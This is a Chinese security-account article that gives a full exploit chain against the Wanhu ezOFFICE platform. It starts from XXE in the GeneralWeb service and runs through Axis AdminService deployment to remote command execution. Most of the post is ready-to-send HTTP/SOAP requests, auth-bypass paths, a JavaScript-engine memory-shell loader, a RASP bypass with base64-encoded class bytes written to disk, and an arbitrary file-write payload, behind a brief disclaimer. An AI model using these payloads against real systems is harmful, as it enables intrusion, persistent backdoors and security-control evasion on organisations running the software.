#  万户ezOFFICE协同管理平台 GeneralWeb XXE to RCE   
Bmth666  Z2O安全攻防   2024-10-16 21:10  
  
点击上方[蓝字]，关注我们  
  
  
**建议大家把公众号“Z2O安全攻防”设为星标，否则可能就看不到啦！**  
因为公众号现在只对常读和星标的公众号才能展示大图推送。操作方法：点击右上角的【...】，然后点击【设为星标】即可。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuao3T9EnGbUIqxgDhEVicCV8NbH4FiaZ3YIbpXNEr6qFicGkAelnQHKGHsVlfapMGgO3DHA68iaiac0n4Q/640?wx_fmt=png "")  
  
  
# 免责声明  
  
  
本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号团队不为此承担任何责任。  
  
# 文章正文  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua9geLxaRyKnicZgyZIsrSNiawKsYP3wzaGO6SMc94yQeDk4AOrcYqc3ZI6JTGzseIFuomcd0txPynA/640?wx_fmt=png&from=appmsg "")  
  
image-20241015185320671  
  
之前实战遇到了，但是网上的poc懂得都懂，索性就专门研究一下  
  
JDK版本：1.6.0 操作系统：Windows Server 2012  
## 漏洞分析  
  
从web.xml看起  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua9geLxaRyKnicZgyZIsrSNiawnBeYgqFS9JZPN7JNCOEwDCjibMq6uAW2m28hCsqhYXnZdVb0KzPXiaQ/640?wx_fmt=png&from=appmsg "null")  
  
图片.png  
  
使用了 XFire 与 Axis 两种 WebService 框架  
  
看到 XFire 配置文件D:/jboss/jboss-as/server/oa/deploy/defaultroot.war/WEB-INF/classes/META-INF/xfire/services.xml  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua9geLxaRyKnicZgyZIsrSNia5zaRC52ED1tHRt1kS1lwnnmHP3IP54s4ib4SYzTY300mZbB9NrUUywQ/640?wx_fmt=png&from=appmsg "null")  
  
图片.png  
  
配置了一个GeneralWeb的服务，找到该类com.whir.service.webservice.GeneralWeb  
```
package com.whir.service.webservice;

import com.whir.service.common.CallApi;

publicclassGeneralWeb{
publicStringOAManager(String input)throwsException{
CallApicallapi=newCallApi();
return callapi.getResult(input);
}
}
com.whir.service.common.CallApi#getResult
publicStringgetResult(String input)throwsException{
if(serviceMap ==null){
thrownewException("Error: serviceMap can not is null");
}
SAXBuilderbuilder=newSAXBuilder();
byte[] b = input.getBytes("utf-8");
InputStreamis=newByteArrayInputStream(b);
Documentdoc= builder.build(is);
Elementroot= doc.getRootElement();
```  
  
使用SAXBuilder进行解析并且未进行过滤，产生XXE漏洞  
  
鉴权方面代码在com.whir.common.util.SetCharacterEncodingFilter  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua9geLxaRyKnicZgyZIsrSNiaPYSEx4lk9HgbdibDFYOVp82gPfzibyw8XOF7JoNbUdGRLYxxazj5buGA/640?wx_fmt=png&from=appmsg "null")  
  
图片.png  
  
使用的是 getRequestURI，那么就有很多绕过方法了，简单列举几个  
```
/iWebOfficeSign/OfficeServer.jsp/../../
/xfservices/./GeneralWeb
.jsp;.js
```  
## 漏洞利用  
  
触发dnslog：  
```
POST /defaultroot/xfservices/./GeneralWeb HTTP/1.1
Host:
User-Agent:Moziilla/5.0(Linux; U;Android2.3.6; en-us;Nexus S Build/GRK39F)AppleWebKit/533.1(KHTML, like Gecko)Version/4.0MobileSafari/533.1
Content-Type: text/xml;charset=UTF-8
SOAPAction:
Content-Length:457

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gen="http://com.whir.service/GeneralWeb">
<soapenv:Body>
<gen:OAManager>
<gen:input>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY x SYSTEM "http://123.6x9ryk.dnslog.cn"&gt;]&gt;
&lt;root&gt;&amp;x;&lt;/root&gt;
</gen:input>
</gen:OAManager>
</soapenv:Body>
</soapenv:Envelope>
```  
  
因为使用了Axis，我们可以通过AdminServlet创建任意服务，看到server-config.wsdd  
```
<service name="AdminService" provider="java:MSG">
 <parameter name="allowedMethods" value="AdminService"/>
 <parameter name="enableRemoteAdmin" value="false"/>
 <parameter name="className" value="org.apache.axis.utils.Admin"/>
 <namespace>http://xml.apache.org/axis/wsdd/</namespace>
</service>
```  
  
那么思路就很清晰了，通过xxe的get请求部署恶意服务，由于JDK是低版本，那么可以部署RhinoScriptEngineService  
```
http://127.0.0.1:{{Port}}/defaultroot/services/./AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22RhinoScriptEngineService%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22com.sun.script.javascript.RhinoScriptEngine%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22eval%22%20%2F%3E%3CtypeMapping%20deserializer%3D%22org.apache.axis.encoding.ser.BeanDeserializerFactory%22%20type%3D%22java%3Ajavax.script.SimpleScriptContext%22%20qname%3D%22ns%3ASimpleScriptContext%22%20serializer%3D%22org.apache.axis.encoding.ser.BeanSerializerFactory%22%20xmlns%3Ans%3D%22urn%3Abeanservice%22%20regenerateElement%3D%22false%22%3E%3C%2FtypeMapping%3E%3C%2Fservice%3E%3C%2Fdeployment
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua9geLxaRyKnicZgyZIsrSNiad3iaP6sebXq9Z5JsfRULtSXTwGK7DySFS4XBQOMeJX9Giaichia36CecCQ/640?wx_fmt=png&from=appmsg "null")  
  
图片.png  
  
部署成功  
```
POST /defaultroot/services/./RhinoScriptEngineService HTTP/1.1
Host:
User-Agent:Moziilla/5.0(Linux; U;Android2.3.6; en-us;Nexus S Build/GRK39F)AppleWebKit/533.1(KHTML, like Gecko)Version/4.0MobileSafari/533.1
Content-Type: text/xml;charset=UTF-8
SOAPAction:
Content-Length:973

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:jav="http://javascript.script.sun.com">
<soapenv:Body>
<eval xmlns="http://127.0.0.1:8080/services/scriptEngine">
<arg0 xmlns="">
<![CDATA[
try{
load("nashorn:Moziilla_compat.js");
}catch(e){
}
importPackage(Packages.java.io);
importPackage(Packages.java.lang);
importPackage(Packages.java.util);

var command ="cmd /c whoami";
var pb =new java.lang.ProcessBuilder(Arrays.asList(command.split(" ")));
var process = pb.start();
var ret =new java.util.Scanner(process.getInputStream()).useDelimiter('\\A').next();
     ret;
]]>
</arg0>
<arg1 xmlns="" xsi:type="urn:SimpleScriptContext" xmlns:urn="urn:beanservice">
</arg1>
</eval>
</soapenv:Body>
</soapenv:Envelope>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua9geLxaRyKnicZgyZIsrSNiaTw2ytdEgQhiaX1dMk86yAMGEknyBNic9MUBL184QAEub9r9fsYiaY1Otg/640?wx_fmt=png&from=appmsg "null")  
  
图片.png  
  
成功执行命令  
### 内存马  
  
Java-Js-Engine-Payloads：https://github.com/yzddmr6/Java-Js-Engine-Payloads  
  
适配了JDK6-14的内存马  
```
try {
    load("nashorn:mozilla_compat.js");
}catch(e){
}

function getUnsafe(){
vartheUnsafeMethod=
        java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
    theUnsafeMethod.setAccessible(true);
return theUnsafeMethod.get(null);
}

function removeClassCache(clazz){
varunsafe= getUnsafe();
varclazzAnonymousClass= unsafe.defineAnonymousClass(
        clazz,
        java.lang.Class.forName("java.lang.Class")
.getResourceAsStream("Class.class")
.readAllBytes(),
null
);
varreflectionDataField=
        clazzAnonymousClass.getDeclaredField("reflectionData");
    unsafe.putObject(clazz, unsafe.objectFieldOffset(reflectionDataField),null);
}

function bypassReflectionFilter(){
var reflectionClass;
try{
        reflectionClass = java.lang.Class.forName(
"jdk.internal.reflect.Reflection"
);
}catch(error){
        reflectionClass = java.lang.Class.forName("sun.reflect.Reflection");
}
varunsafe= getUnsafe();
varclassBuffer= reflectionClass
.getResourceAsStream("Reflection.class")
.readAllBytes();
varreflectionAnonymousClass= unsafe.defineAnonymousClass(
        reflectionClass,
        classBuffer,
null
);
varfieldFilterMapField=
        reflectionAnonymousClass.getDeclaredField("fieldFilterMap");
varmethodFilterMapField=
        reflectionAnonymousClass.getDeclaredField("methodFilterMap");
if(
        fieldFilterMapField
.getType()
.isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))
){
        unsafe.putObject(
            reflectionClass,
            unsafe.staticFieldOffset(fieldFilterMapField),
            java.lang.Class.forName("java.util.HashMap")
.getConstructor()
.newInstance()
);
}
if(
        methodFilterMapField
.getType()
.isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))
){
        unsafe.putObject(
            reflectionClass,
            unsafe.staticFieldOffset(methodFilterMapField),
            java.lang.Class.forName("java.util.HashMap")
.getConstructor()
.newInstance()
);
}
    removeClassCache(java.lang.Class.forName("java.lang.Class"));
}

function setAccessible(accessibleObject){
varunsafe= getUnsafe();
varoverrideField= java.lang.Class.forName(
"java.lang.reflect.AccessibleObject"
).getDeclaredField("override");
varoffset= unsafe.objectFieldOffset(overrideField);
    unsafe.putBoolean(accessibleObject, offset,true);
}

function defineClass(bytes){
varclz=null;
varversion= java.lang.System.getProperty("java.version");
varunsafe= getUnsafe();
varclassLoader=newjava.net.URLClassLoader(
        java.lang.reflect.Array.newInstance(
            java.lang.Class.forName("java.net.URL"),
0
)
);
try{
if(version.split(".")[0]&gt;=11){
            bypassReflectionFilter();
            defineClassMethod = java.lang.Class.forName(
"java.lang.ClassLoader"
).getDeclaredMethod(
"defineClass",
                java.lang.Class.forName("[B"),
                java.lang.Integer.TYPE,
                java.lang.Integer.TYPE
);
            setAccessible(defineClassMethod);
            clz = defineClassMethod.invoke(classLoader, bytes,0, bytes.length);
}else{
varprotectionDomain=newjava.security.ProtectionDomain(
newjava.security.CodeSource(
null,
                    java.lang.reflect.Array.newInstance(
                        java.lang.Class.forName("java.security.cert.Certificate"),
0
)
),
null,
                classLoader,
[]
);
            clz = unsafe.defineClass(
null,
                bytes,
0,
                bytes.length,
                classLoader,
                protectionDomain
);
}
}catch(error){
        error.printStackTrace();
}finally{
return clz;
}
}

function base64DecodeToByte(str){
var bt;
try{
        bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
}catch(e){
        bt = java.lang.Class.forName("java.util.Base64").newInstance().getDecoder().decode(str);
}
return bt;
}
clz = defineClass(base64DecodeToByte(code));
clz.newInstance();
```  
  
由于JBoss 低版本套的是 tomcat，所以直接使用 tomcat 内存马即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua9geLxaRyKnicZgyZIsrSNiafSf28LPrr4nPGjDWNZZB2jnz0iaJhXZhb9LWgqog8icsRCNYozZ16AcQ/640?wx_fmt=png&from=appmsg "null")  
  
图片.png  
  
使用Listener组件，容错高  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua9geLxaRyKnicZgyZIsrSNiaBYoCrkM6Fic9fHOlUEELMVhlb0wtPHtwM2PUqDHh4RrCc1NibtuUVlxw/640?wx_fmt=png&from=appmsg "null")  
  
图片.png  
  
执行，无报错并且返回 200，说明成功了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua9geLxaRyKnicZgyZIsrSNiaktyXyEOnQcOwXib8Pp3oDQ1Ez0hia8PICGiaXBKJU1WUG2JaU6jvhnglQ/640?wx_fmt=png&from=appmsg "null")  
  
图片.png  
  
随便找个路径连接即可  
### RASP绕过  
  
在命令执行的时候可能会遇到：**java.lang.SecurityException: cmd execute denied !!!**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua9geLxaRyKnicZgyZIsrSNiaJC7apFQP7icDvcPicZvEq6z2oBvUHccgTJfkssdauQWZYI0PrGzAiaBmQ/640?wx_fmt=png&from=appmsg "null")  
  
图片.png  
  
即存在RASP，而RASP一般是通过黑名单进行过滤的  
  
这里禁用了ProcessBuilder，我们尝试更底层的命令执行：ProcessImpl，该类是private，所以只能反射调用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua9geLxaRyKnicZgyZIsrSNia3ibblEA5yicAHbNCVVXYKWe0XYAwL1GeYqOYqKgiaNCe323c6nnwV5Kiag/640?wx_fmt=png&from=appmsg "null")  
  
图片.png  
  
这里JDK1.6和JDK1.8的构造方法存在差异，所以需要小小修改一下  
  
当调用setAccessible的时候会报错：  
```
sun.org.mozilla.javascript.internal.EcmaError: TypeError: Cannot call method "setAccessible" of null
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua9geLxaRyKnicZgyZIsrSNiajl2N47pUp6TaMwRxekKjaRpUujhHuOZtzdyGSUz66WIEagSym91KRA/640?wx_fmt=png&from=appmsg "null")  
  
图片.png  
  
在js中无法反射调用，根据网上的文章，我们可以写class文件然后URLClassLoader去加载  
```
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Map;

publicclassTestcmd{
Stringresult="";
publicTestcmd(String paramString)throwsException{
booleanisLinux=true;
StringosTyp=System.getProperty("os.name");
if(osTyp !=null&amp;&amp; osTyp.toLowerCase().contains("win")){
            isLinux =false;
}
String[] cmds = isLinux ?newString[]{"bash","-c", paramString}:newString[]{"cmd.exe","/c", paramString};

Classclazz=Class.forName("java.lang.ProcessImpl");
Methodmethod= clazz.getDeclaredMethod("start",String[].class,Map.class,String.class,boolean.class);
        method.setAccessible(true);
InputStreamins=((Process) method.invoke(null,cmds,null,null,true)).getInputStream();
ByteArrayOutputStreambos=newByteArrayOutputStream();
byte[] bytes =newbyte[1024];
int size;
while((size = ins.read(bytes))&gt;0)
                bos.write(bytes,0,size);

        ins.close();
this.result = bos.toString();
}

public java.lang.StringtoString(){
returnthis.result;
}
publicstaticvoidmain(String[] args){
}
}
```  
  
没有ban掉File类，可以将class文件写入到系统中  
```
try {
load("nashorn:Moziilla_compat.js");
}catch(e){
}
importPackage(Packages.java.io);
importPackage(Packages.java.lang);
importPackage(Packages.sun.misc);

varfile=newFile("../server/Testcmd.class");

varfos=newFileOutputStream(file);
varbase64Decoder=newBASE64Decoder();
vardecodeContent= base64Decoder.decodeBuffer("yv66vgAAADIAkAoAFwBPCABQCQAiAFEIAFIKAFMAVAoACQBVCABWCgAJAFcHAFgIAFkIAFoIAFsIAFwIAF0KABEAXggAXwcAYAcAMQcAYQkAYgBjCgARAGQKAGUAZgcAZwoAYgBoCgBlAGkHAGoKABoAawcAbAoAHABPCgBtAG4KABwAbwoAbQBwCgAcAHEHAHIBAAZyZXN1bHQBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEACUxUZXN0Y21kOwEAC3BhcmFtU3RyaW5nAQAHaXNMaW51eAEAAVoBAAVvc1R5cAEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAFY2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEABm1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQADaW5zAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQADYm9zAQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEABWJ5dGVzAQACW0IBAARzaXplAQABSQEADVN0YWNrTWFwVGFibGUHAHIHAFgHAGAHAHMHAHQHAGwHADsBAApFeGNlcHRpb25zBwB1AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAClNvdXJjZUZpbGUBACFUZXN0Y21kLmphdmEgZnJvbSBJbnB1dEZpbGVPYmplY3QMACUAdgEAAAwAIwAkAQAHb3MubmFtZQcAdwwAeAB5DAB6AEkBAAN3aW4MAHsAfAEAEGphdmEvbGFuZy9TdHJpbmcBAARiYXNoAQACLWMBAAdjbWQuZXhlAQACL2MBABVqYXZhLmxhbmcuUHJvY2Vzc0ltcGwMAH0AfgEABXN0YXJ0AQAPamF2YS9sYW5nL0NsYXNzAQANamF2YS91dGlsL01hcAcAfwwAgAAzDACBAIIHAHMMAIMAhAEAEGphdmEvbGFuZy9PYmplY3QMAIUAhgwAhwCIAQARamF2YS9sYW5nL1Byb2Nlc3MMAIkAigEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwB0DACLAIwMAI0AjgwAjwB2DABIAEkBAAdUZXN0Y21kAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQATamF2YS9pby9JbnB1dFN0cmVhbQEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAMoKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEWphdmEvbGFuZy9Cb29sZWFuAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAHdmFsdWVPZgEAFihaKUxqYXZhL2xhbmcvQm9vbGVhbjsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAEcmVhZAEABShbQilJAQAFd3JpdGUBAAcoW0JJSSlWAQAFY2xvc2UAIQAiABcAAAABAAAAIwAkAAAAAwABACUAJgACACcAAAH5AAYACwAAAOIqtwABKhICtQADBD0SBLgABU4txgARLbYABhIHtgAImQAFAz0cmQAYBr0ACVkDEgpTWQQSC1NZBStTpwAVBr0ACVkDEgxTWQQSDVNZBStTOgQSDrgADzoFGQUSEAe9ABFZAxMAElNZBBMAE1NZBRMACVNZBrIAFFO2ABU6BhkGBLYAFhkGAQe9ABdZAxkEU1kEAVNZBQFTWQYEuAAYU7YAGcAAGrYAGzoHuwAcWbcAHToIEQQAvAg6CRkHGQm2AB5ZNgqeABAZCBkJAxUKtgAfp//pGQe2ACAqGQi2ACG1AAOxAAAAAwAoAAAASgASAAAACAAEAAcACgAJAAwACgASAAsAIgAMACQADgBRABAAWAARAH0AEgCDABMAqQAUALIAFQC5ABcAxgAYANMAGgDYABsA4QAcACkAAABwAAsAAADiACoAKwAAAAAA4gAsACQAAQAMANYALQAuAAIAEgDQAC8AJAADAFEAkQAwADEABABYAIoAMgAzAAUAfQBlADQANQAGAKkAOQA2ADcABwCyADAAOAA5AAgAuQApADoAOwAJAMMAHwA8AD0ACgA+AAAAPwAF/wAkAAQHAD8HAEABBwBAAAAYUQcAEv8AaQAKBwA/BwBAAQcAQAcAEgcAQQcAQgcAQwcARAcARQAA/AAZAQBGAAAABAABAEcAAQBIAEkAAQAnAAAALwABAAEAAAAFKrQAA7AAAAACACgAAAAGAAEAAAAeACkAAAAMAAEAAAAFACoAKwAAAAkASgBLAAEAJwAAACsAAAABAAAAAbEAAAACACgAAAAGAAEAAAAiACkAAAAMAAEAAAABAEwAMQAAAAEATQAAAAIATg==");
fos.write(decodeContent,newInteger(0),newInteger(decodeContent.length));
fos.close();
```  
  
最后就是网上公开的poc了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua9geLxaRyKnicZgyZIsrSNiaBkQcSlcezJKicHAXcGicWsef7aCOMsZvnELlXWyMibgye3YygS7vC3Ljg/640?wx_fmt=png&from=appmsg "null")  
  
图片.png  
### StringUtil任意文件写  
  
网上还存在一种方法：使用com.whir.ezoffice.ezform.util.StringUtil这个类写文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua9geLxaRyKnicZgyZIsrSNiaUPJlIiaWJqKQyYlW03XjOI200G70jppgJnZIhStKP1kxcWWE8sVsNqg/640?wx_fmt=png&from=appmsg "null")  
  
图片.png  
  
存在无参构造方法，满足service条件  
```
private staticvoidwriteToFile(String fileName, String content)throwsIOException{
BufferedOutputStreamoutStream=null;
OutputStreamWriterwriter=null;

try{
StringdirPath="";
if(fileName.lastIndexOf("/")!=-1){
            dirPath = fileName.substring(0, fileName.lastIndexOf("/"));
}

Filedir=newFile(dirPath);
if(!dir.exists()&amp;&amp;!dir.mkdirs()){
thrownewIOException("create directory '"+ dirPath +"' failed!");
}

        outStream =newBufferedOutputStream(newFileOutputStream(fileName,true));
        writer =newOutputStreamWriter(outStream);
        writer.write(content);
}catch(IOException var9){
throw var9;
}finally{
if(writer !=null){
            writer.close();
}

if(outStream !=null){
            outStream.close();
}

}

}

publicstaticvoidprintToFile(String fileName, String content)throwsIOException{
    writeToFile(fileName, content);
}

publicstaticvoidprintlnToFile(String fileName, String content)throwsIOException{
    writeToFile(fileName, content +"\n");
}
```  
  
可以通过 printToFile 方法任意文件写，内容以及文件名均可控  
```
http://127.0.0.1:{{port}}/defaultroot/services/./AdminService?method=!--%3E%3Cdeployment%20xmlns=%22http://xml.apache.org/axis/wsdd/%22%20xmlns:java=%22http://xml.apache.org/axis/wsdd/providers/java%22%3E%3Cservice%20name=%22freemarkerQa%22%20provider=%22java:RPC%22%3E%3Cparameter%20name=%22className%22%20value=%22com.whir.ezoffice.ezform.util.StringUtil%22/%3E%3Cparameter%20name=%22allowedMethods%22%20value=%22*%22/%3E%3C/service%3E%3C/deployment
```  
  
网上众多的 freemarkerQa 服务均是调用的该类  
```
POST /defaultroot/./services/freemarkerQa HTTP/1.1
Host:
User-Agent:Moziilla/5.0(Linux; U;Android2.3.6; en-us;Nexus S Build/GRK39F)AppleWebKit/533.1(KHTML, like Gecko)Version/4.0MobileSafari/533.1
SOAPAction:
Content-Type: text/xml;charset=UTF-8
Content-Length:606

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://util.ezform.ezoffice.whir.com">
<soapenv:Body>
<util:printToFile soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<fileName xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">../server/oa/deploy/defaultroot.war/1.txt</fileName>
<content xsi:type="soapenc:string">x</content>
</util:printToFile>
</soapenv:Body>
</soapenv:Envelope>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua9geLxaRyKnicZgyZIsrSNiazXFcmcyOQprkMdAkGN4r8rCibYKicuc9LicGS4YUZd3jwfj5pNJrCjNeA/640?wx_fmt=png&from=appmsg "null")  
  
图片.png  
  
验证成功  
  
文章来源：https://forum.butian.net/share/3784  
  
  
  
### 考证咨询  
  
  
最优惠报考  
各类安全证书(NISP/CISP/CISSP/PTE/PTS/PMP/IRE等....)，后台回复"  
好友位"咨询。  
  
# 技术交流  
  
  
### 知识星球  
  
  
**欢迎加入知识星球****，星球致力于红蓝对抗，实战攻防，星球不定时更新内外网攻防渗透技巧，以及最新学习研究成果等。常态化更新最新安全动态。针对网络安全成员的普遍水平，为星友提供了教程、工具、POC&EXP以及各种学习笔记等等。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYl1eHu25UAxhOZEBXZpSmXPg6kVsggaWKZsh0ab2kh6icbbkBgOH8icuV0x2IPGGRMiaU2hNBErstcA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYl1eHu25UAxhOZEBXZpSmX8Pjria4EK9ib8PPUAxiaMaSqUZibdxNoqqmmVHqGwXkYdzziaZNDLOwCGQw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKubkRgdNbBQdOZibtbt7oibUpdUIl55vlmiaibqInxXG1Z9tfo52jF8onER5R4U2mCM5RpZia6rwEHnlMAg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYItiapGtLIq3gAQYGfE5nictnkFeBicm7brKdibz4Va1hRf2dKZT0IyRRXYboE1lbZ6ZquDGnzqKibGGw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKub0WpCibOMMSdictvo8OHh6dticYAz6QYzXibSpQD5ohWB1ambKv8Tamf7H6RjyVjVXxibKorFAeDeILOg/640?wx_fmt=jpeg "")  
  
### SRC专项小密圈  
  
  
建立了一个  
src专项圈子，内容包含src漏洞知识库、src挖掘技巧、src视频教程等，一起学习赚赏金技巧，以及专属微信群一起挖洞  
  
圈子专注于更新src相关：  
  
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例  
  
2、分享src优质视频课程  
  
3、分享src挖掘技巧tips  
  
4、小群一起挖洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKubFwdSPXQsKa26pDbfpibrMmrSPHTSFRngH7o2m2tXCzo3wM38mzOwDAkAZpD4b1xXYVuW4lgh9eYQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYODY5bOdObv8wfzFQ52oz8SJxJJnibwZZ90X2lqa5Vz6hSDmZGic05icehib38Po1JsHd1uyahmC9mAA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYODY5bOdObv8wfzFQ52oz8ETvmJHX0UAk8pD3Z0OLU1veCNXpPhgGMvhas7wAz9eYjAicJiaCYJYng/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKuYbBtKotHSdHiakQJhjAQibJtibuWIrLXodxuZpTKwAl2zOz70DLbiaj5QTlExdjoHvvtZHufxHkuZU6g/640?wx_fmt=jpeg&from=appmsg "")  
  
  
### 交流群  
  
  
关注公众号回复“**加群**”，添加Z2OBot好友，自动拉你加入**Z2O安全攻防交流群(微信群)**分享更多好东西。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYMO5aHRB3TbIy3xezlTAkbFzqIRfZNnicxSC23h1UmemDu9Jq38xrleA6NyoWBu1nAj0nmE6YXEHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
### 关注我们  
  
  
  
**关注福利：**  
  
**回复“**  
**书籍****" 获取  网络安全书籍PDF教程**  
  
**回复“**  
**字典****" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。**  
  
**回复“漏洞库" 获取 最新漏洞POC库(**  
**1.2W+****)******  
  
**回复“资料" 获取 网络安全、渗透测试相关资料文档合集**  
  
****  
点个【 在看 】，你最好看  
  
  
